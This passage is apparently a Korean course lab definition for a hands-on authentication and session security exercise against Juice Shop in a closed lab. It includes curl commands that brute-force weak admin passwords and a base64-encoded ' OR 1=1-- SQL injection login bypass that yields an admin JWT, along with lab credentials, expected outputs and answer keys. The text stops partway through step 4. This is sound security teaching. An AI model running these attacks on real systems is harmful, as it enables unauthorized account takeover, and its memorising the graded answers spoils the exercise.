lab_id: standalone-web-vuln-week04
title: "인증/세션 — 약한 PW·JWT·세션 고정 vs 인증 보안 점검"
version: standalone-web-vuln
course: web-vuln
week: 4
description: |
  인증·세션 점검(OWASP A07, WSTG-ATHN/SESS) 실습. 인증(로그인 순간)과 세션(로그인 이후 신원 유지)을
  점검자의 손으로 두드려 본다. 무차별 대입으로 약한 PW·rate-limit 부재를 확인하고, SQL Injection 인증
  우회(' OR 1=1--)로 비밀번호를 건너뛰어 관리자 JWT를 획득하며, 그 JWT의 payload를 base64 디코드해
  정보 노출을 보이고, 세션 쿠키의 보호 플래그(HttpOnly/Secure/SameSite)를 점검한다. 마지막으로 같은
  공격이 방어 스택(접근로그의 로그인 폭주 + WAF 942의 SQLi 우회)에 남기는 흔적을 찾고, 다층 인증·세션
  방어를 정리한다. 대상은 juiceshop(JWT 기반)/dvwa(PHP 세션, 차단형). 공격은 외부 공격자 VM
  192.168.0.202(att/1)에서 공인 진입 192.168.0.161로 — `ssh att@192.168.0.202`(비번 1)로 접속해 수행하고,
  방어 로그 확인은 `ssh ccc@{{TARGET_IP}}`(el34 호스트) 후 `docker exec -it el34-web bash`. 인가된 실습만.
difficulty: hard
duration_minutes: 170
prerequisites:
  - "W01–W03 통과 (수동 HTTP 점검·자동 스캐너·정보수집)"
  - "el34 호스트 SSH 접속 + docker exec 사용법 숙지"
  - "lecture §2(인증 4공격: 무차별/스터핑/SQLi 우회/기본계정) §3(JWT 구조·약점) §4(세션 쿠키·고정) 숙지"
objectives:
  - "무차별 대입으로 약한 PW·rate-limit 부재를 판정하고, SQLi 인증 우회(' OR 1=1--)로 PW 없이 관리자 JWT 획득"
  - "JWT payload를 base64 디코드해 정보 노출을 입증하고, 세션 쿠키의 HttpOnly/Secure/SameSite 플래그 점검"
  - "로그인 남용·SQLi 우회의 방어 흔적(접근로그/WAF 942)을 찾고, 다층 인증·세션 방어(rate-limit·MFA·parameterized query·JWT 검증·쿠키 플래그)를 정리"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 목표
      인증 점검의 출발점 — juiceshop 로그인 API가 살아 있는지, 어떤 방식(JWT 발급)인지 확인한다.
      ## 개념 한 줄
      점검자는 본격 공격 전에 항상 대상의 동작부터 본다. 잘못된 자격증명에 어떤 응답이 오는지가
      인증이 정상 동작 중인지를 알려주는 첫 신호다(WSTG-ATHN).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) juiceshop 로그인 API에 잘못된 자격증명(x/x)을 POST → 응답코드만 login= 형식으로(인증 정상 동작 확인)
      curl -s -o /dev/null -w 'login=%{http_code}\n' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"x","password":"x"}' http://192.168.0.161/rest/user/login
      # 2) 해석 — 401=실패(정상). 이 응답이 이후 공격의 기준선이 된다
      echo "→ 401=실패(정상). 인증 점검 대상"
      ```
      ## ✅ 합격 기준
      `login=` 출력 시 통과. **근거:** 로그인 API가 응답해 `login=<코드>` 가 나오면 인증 점검을 시작할 수
      있고, 잘못된 자격증명에 401이면 인증이 정상 동작 중이라는 기준선이다.
      ## 🧰 옵션 풀이
      - `curl -s`: 진행률 표시를 숨김(조용히). `-o /dev/null`: 응답 본문을 버림(코드만 볼 때).
      - `-w 'login=%{http_code}\n'`: 응답 후 HTTP 상태 코드만 출력하는 포맷.
      - `-X POST` + `-d '{...}'`: 로그인은 POST로 JSON 자격증명을 전송. `-H 'Host: juice.el34.lab'`로
        web Apache가 juiceshop vhost로 라우팅하게 한다.
    hint: 'login API'
    category: survey
    points: 10
    answer: |
      # 1) juiceshop 로그인 API에 잘못된 자격증명(x/x)을 POST → 응답코드만 login= 형식으로(인증 정상 동작 확인)
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'login=%{http_code}\n' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"x\",\"password\":\"x\"}' http://192.168.0.161/rest/user/login"
      # 2) 해석 — 401=실패(정상). 이 응답이 이후 공격의 기준선이 된다
      echo "→ 401=실패(정상). 인증 점검 대상"
    answer_detail: "인증 점검의 첫 단계 = 대상 로그인 API 동작 확인. juiceshop /rest/user/login은 성공 시 JWT를 발급하는 인증 엔드포인트다. 잘못된 자격증명(email/password=x)에 401(Unauthorized)이 떨어지면 인증이 정상 동작 중이라는 뜻 — 이것이 정상이며 이후 공격의 기준선이 된다. 채점은 stdout에 'login='이 보이는지로 판정한다."
    expected_output: |
      login=401
      → 401=실패(정상). 인증 점검 대상
    verify:
      type: output_contains
      expect: 'login='
      field: stdout
      semantic:
        intent: "로그인 API 점검"
        success_criteria: ["응답코드"]
        acceptable_methods: ["**[OSS] curl login (권장)**"]
    target_vm: web

  - order: 2
    instruction: |
      ## 🎯 목표
      관리자 계정에 약한 비밀번호 목록을 반복 시도해, rate-limit/lockout 의 유무와 약한 PW의 위험을
      직접 체감한다.
      ## 개념 한 줄
      무차별 대입(brute force)은 가능한 비밀번호를 사전·조합으로 반복 시도하는 가장 기본적인 인증
      공격이다. 시도 횟수 제한(rate-limit)이 없으면 약한 PW는 순식간에 뚫린다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) 관리자 계정에 약한 PW(admin/123456/password/admin123)를 하나씩 대입 → 각 결과를 pw=PW:코드 로 나열
      curl -s -o /dev/null -w 'pw=admin:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin"}' http://192.168.0.161/rest/user/login
      curl -s -o /dev/null -w 'pw=123456:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"123456"}' http://192.168.0.161/rest/user/login
      curl -s -o /dev/null -w 'pw=password:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"password"}' http://192.168.0.161/rest/user/login
      curl -s -o /dev/null -w 'pw=admin123:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{"email":"admin@juice-sh.op","password":"admin123"}' http://192.168.0.161/rest/user/login
      echo
      # 2) 해석 — 200=성공(약한 PW), 401=실패. rate-limit 없으면 반복이 막히지 않음
      echo "→ 200=성공(약한 PW), 401=실패. rate-limit 없으면 무차별 대입 가능"
      ```
      ## ✅ 합격 기준
      `pw=admin` 출력 시 통과. **근거:** 약한 PW 목록이 차례로 시도되어 `pw=<PW>:<코드>` 가 나오면
      무차별 대입이 수행된 것이고(200=성공/401=실패), rate-limit 부재 시 반복이 막히지 않음을 확인한다.
      ## 🧰 옵션 풀이
      - `for p in ...; do ...; done`: 셸 반복문 — 약한 PW 목록(admin/123456/password/admin123)을 차례로
        대입한다. rate-limit이 없으면 이 반복이 막히지 않고 끝까지 돈다는 점이 핵심 관찰이다.
      - email은 juiceshop 관리자(`admin@juice-sh.op`)로 고정하고 password만 바꿔 가며 시도한다.
    hint: '여러 PW 로그인 시도'
    category: manipulation
    points: 12
    answer: |
      # 1) 관리자 계정에 약한 PW(admin/123456/password/admin123)를 하나씩 대입 → 각 결과를 pw=PW:코드 로 나열
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'pw=admin:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin\"}' http://192.168.0.161/rest/user/login"
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'pw=123456:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"123456\"}' http://192.168.0.161/rest/user/login"
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'pw=password:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"password\"}' http://192.168.0.161/rest/user/login"
      ssh att@192.168.0.202 "curl -s -o /dev/null -w 'pw=admin123:%{http_code} ' -X POST -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d '{\"email\":\"admin@juice-sh.op\",\"password\":\"admin123\"}' http://192.168.0.161/rest/user/login"
      echo
      # 2) 해석 — 200=성공(약한 PW), 401=실패. rate-limit 없으면 반복이 막히지 않음
      echo "→ 200=성공(약한 PW), 401=실패. rate-limit 없으면 무차별 대입 가능"
    answer_detail: "무차별 대입(brute force) = 약한 PW를 사전으로 반복 시도하는 가장 단순한 인증 공격. 성공 조건은 두 가지 — 약한 PW + rate-limit/lockout 부재. 응답 200은 약한 PW를 맞힌 성공, 401은 실패다. 핵심 관찰은 rate-limit이 없으면 반복이 막히지 않는다는 것 — 이것이 미션 6(탐지)에서 접근로그의 로그인 폭주로 드러난다. 채점은 stdout에 'pw=admin'이 보이는지(첫 시도가 수행됐는지)로 판정한다."
    expected_output: |
      pw=admin:401 pw=123456:401 pw=password:401 pw=admin123:200
      → 200=성공(약한 PW), 401=실패. rate-limit 없으면 무차별 대입 가능
    verify:
      type: output_contains
      expect: 'pw=admin'
      field: stdout
      semantic:
        intent: "무차별 대입"
        success_criteria: ["여러 PW 시도"]
        acceptable_methods: ["**[OSS] 반복 로그인 (권장)**"]
    target_vm: web

  - order: 3
    instruction: |
      ## 🎯 목표
      비밀번호를 맞히는 게 아니라 **건너뛴다**. SQL Injection으로 로그인 조건을 항상 참으로 만들어,
      비밀번호 없이 관리자 JWT를 획득한다.
      ## 개념 한 줄
      SQLi 인증 우회는 email 자리에 `' OR 1=1--`를 넣어, 로그인 쿼리를 `... WHERE email='' OR 1=1--`
      로 조작한다. `OR 1=1`이 조건을 무조건 참으로 만들고 `--`가 비밀번호 검사를 주석 처리해, DB가 첫
      사용자(관리자)를 반환 → 앱이 관리자 JWT를 발급한다. (데이터를 빼내는 Union/Blind SQLi와 sqlmap은 W05.)
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) SQLi 우회 페이로드 {"email":"' OR 1=1--","password":"x"} 를 base64 디코드해 임시 JSON으로 저장(따옴표 충돌 회피)
      echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv4.json
      # 2) 그 페이로드(@파일)를 로그인 API에 전송 → 응답 앞 120자 확인(authentication/token 필드=우회 성공), 임시파일 정리
      curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/wv4.json http://192.168.0.161/rest/user/login | head -c 120; rm -f /tmp/wv4.json
      echo ""
      # 3) 해석 — ' OR 1=1-- 로 PW 검사를 건너뛰고 admin JWT 획득(rate-limit/PW와 무관)
      echo "→ ' OR 1=1-- → admin JWT 획득 = 인증 우회(rate-limit/PW와 무관)"
      ```
      ## ✅ 합격 기준
      `authentication` 출력 시 통과. **근거:** 응답에 인증 토큰(`authentication`/`token` 필드) 이 보이면
      비밀번호 없이 로그인된 것 — SQLi 인증 우회 성공이다.
      ## 🧰 옵션 풀이
      - base64 한 단계: 페이로드 JSON `{"email":"' OR 1=1--","password":"x"}`에는 셸과 충돌하는 따옴표가
        많아, base64로 인코딩한 문자열을 컨테이너 안에서 `base64 -d`로 풀어 파일(`/tmp/wv4.json`)에 쓴다.
      - `-d @/tmp/wv4.json`: `@`는 "이 파일의 내용을 본문으로 전송"이라는 curl 표기. 마지막에 `rm -f`로
        임시 파일을 정리한다.
    hint: "' OR 1=1-- → token"
    category: manipulation
    points: 14
    answer: |
      # 1) SQLi 우회 페이로드 {"email":"' OR 1=1--","password":"x"} 를 base64 디코드해 임시 JSON으로 저장(따옴표 충돌 회피)
      ssh att@192.168.0.202 'echo eyJlbWFpbCI6IicgT1IgMT0xLS0iLCJwYXNzd29yZCI6IngifQo= | base64 -d > /tmp/wv4.json'
      # 2) 그 페이로드(@파일)를 로그인 API에 전송 → 응답 앞 120자 확인(authentication/token 필드=우회 성공), 임시파일 정리
      ssh att@192.168.0.202 "curl -s -H 'Host: juice.el34.lab' -H 'Content-Type: application/json' -d @/tmp/wv4.json http://192.168.0.161/rest/user/login | head -c 120; rm -f /tmp/wv4.json"
      echo ""
      # 3) 해석 — ' OR 1=1-- 로 PW 검사를 건너뛰고 admin JWT 획득(rate-limit/PW와 무관)
      echo "→ ' OR 1=1-- → admin JWT 획득 = 인증 우회(rate-limit/PW와 무관)"
    answer_detail: "SQLi 인증 우회 = 비밀번호를 푸는 게 아니라 검사 로직 자체를 무력화하는 공격. 안전하지 않은 로그인 쿼리(SELECT ... WHERE email='입력' AND password='입력')의 email 자리에 ' OR 1=1--를 넣으면, 따옴표가 닫히고 OR 1=1(항상 참)이 끼어들며 -- 뒤(PW 검사)가 주석 처리되어 사라진다 → DB가 첫 사용자(관리자)를 반환 → 관리자 JWT 발급. 무차별 대입과 달리 비밀번호가 강하든 rate-limit이 있든 통하므로 훨씬 강력하다. 차단형 dvwa였다면 같은 페이로드가 WAF 942 룰군에 걸려 403으로 막힌다. 채점은 stdout에 'authentication'(토큰 응답 필드)이 보이는지로 판정한다."
    expected_output: |
      {"authentication":{"token":"eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwidXNlcm5
      → ' OR 1=1-- → admin JWT 획득 = 인증 우회(rate-limit/PW와 무관)
    verify:
      type: output_contains
      expect: 'authentication'
      field: stdout
      semantic:
        intent: "SQLi 인증 우회 + JWT"
        success_criteria: ["token 획득"]
        acceptable_methods: ["**[OSS] login SQLi (권장)**"]
    target_vm: web

  - order: 4
    instruction: |
      ## 🎯 목표
      앞서 받은 JWT가 신원을 어떻게 담는지 들여다봐, "payload는 암호화가 아니다"라는 JWT의 핵심
      오해를 깬다 — 누구나 디코드해 안을 읽을 수 있다.
      ## 개념 한 줄
      JWT는 점(.)으로 나뉜 세 칸(header.payload.signature)이고 각 칸은 base64url 인코딩일 뿐 암호화가
      아니다. 가운데 칸(payload)만 디코드하면 email·권한 같은 정보가 평문으로 노출된다(WSTG-SESS).
      ## 💻 실행 명령 (한 줄씩 따라 실행)

      **공격 VM:** `ssh att@192.168.0.202`(비번 1) 로 접속해 실행한다.

      ```bash
      # 1) (미션3과 동일) SQLi 우회 페이로드를 base64 디코드해 임시 JSON으로 저장
